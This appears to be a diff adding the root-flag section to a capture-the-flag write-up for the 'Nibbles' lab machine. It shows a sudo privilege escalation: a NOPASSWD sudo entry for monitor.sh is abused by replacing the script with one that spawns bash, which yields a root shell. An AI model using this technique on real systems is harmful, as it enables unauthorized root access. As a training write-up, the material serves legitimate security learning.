@@ -230,3 +230,55 @@ cat user.txt
 nibbler@Nibbles:/home/nibbler$ 
 ```
 ## Obtaining root flag
+
+First, let us check if we are able to execute any programs with sudo privileges using this account on SSH. We discovered that we can execute a monitor.sh program with sudo privileges, but we are unable to find any monitor.sh files. However, we do find a ```personal.zip``` file in the current directory.
+
+```
+nibbler@Nibbles:/home/nibbler$ sudo -l
+sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler$ 
+nibbler@Nibbles:/home/nibbler$ ls
+ls
+personal.zip  user.txt
+```
+
+Unzipping the file, we would realize that we will obtain the ```monitor.sh``` file. Investigating the file, we realize that the file seems to be running some kind of health-monitoring on the server. 
+
+Let's create our own monitor.sh file and replace the ```/personal/stuff/monitor.sh``` file. Afterwards we will execute the ```monitor.sh``` file to obtain a root shell
+
+```
+nibbler@Nibbles:/home/nibbler$ echo '#!/biin/bash' > monitor.sh
+echo '#!/biin/bash' > monitor.sh
+nibbler@Nibbles:/home/nibbler$ rm -rf monitor.sh
+rm -rf monitor.sh
+nibbler@Nibbles:/home/nibbler$ echo '#!/bin/bash' > monitor.sh
+echo '#!/bin/bash' > monitor.sh
+nibbler@Nibbles:/home/nibbler$ echo 'bash' >> monitor.sh
+echo 'bash' >> monitor.sh
+nibbler@Nibbles:/home/nibbler$ chmod 777 monitor.sh
+chmod 777 monitor.sh
+nibbler@Nibbles:/home/nibbler$ cd personal/stuff
+cd personal/stuff
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
+ls
+monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
+sudo ./monitor.sh
+root@Nibbles:/home/nibbler/personal/stuff# 
+```
+
+All that is left for us to do is to obtain the root flag.
+
+```
+root@Nibbles:~# cd /root
+cd /root
+root@Nibbles:~# cat root.txt
+cat root.txt
+<Redacted root flag>
+root@Nibbles:~# 
+```
